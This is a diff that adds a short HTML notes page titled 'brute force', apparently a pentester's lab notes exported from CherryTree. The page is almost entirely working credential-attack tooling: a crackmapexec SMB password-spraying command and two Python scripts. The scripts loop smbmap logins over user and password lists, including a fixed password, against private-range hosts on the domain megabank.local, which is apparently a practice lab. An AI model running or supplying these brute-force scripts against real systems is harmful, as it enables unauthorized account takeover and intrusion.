@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>brute force</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>brute force</h1><br/>crackmapexec smb 10.10.10.161 -u userlist.txt -p passwordlist.txt<br /><br />#!/bin/python3<br />import os<br />names = [<br />&quot;zach&quot;, &quot;gustavo&quot;, &quot;claude&quot;, &quot;per&quot;, &quot;felicia&quot;, &quot;claire&quot;, &quot;fred&quot;, &quot;annette&quot;, &quot;stevie&quot;, &quot;angela&quot;, &quot;ulf&quot;, &quot;marcus&quot;, &quot;abigail&quot;, &quot;sally&quot;, &quot;annika&quot;, &quot;marko&quot;, &quot;melanie&quot;, &quot;paulo&quot;<br />]<br />for name in names:<br />        print(name)<br />        os.system(&quot;smbmap -u {} -d megabank.local -p Welcome123! -H 10.10.10.169&quot;.format(name))<br /><br /><br />#!/usr/bin/python3<br />import os<br />import subprocess<br /><br />users   = open(&#39;users.txt&#39;).read().split()<br />passs   = open(&#39;pass.txt&#39;).read().split()<br /><br />for user in users:<br />        for pw in passs:<br />                print(&quot;{}:{}&quot;.format(user,pw))<br />                os.system(&quot;smbmap -u {} -d megabank.local -p {} -H 10.10.10.172&quot;.format(user, pw))</div></body></html>
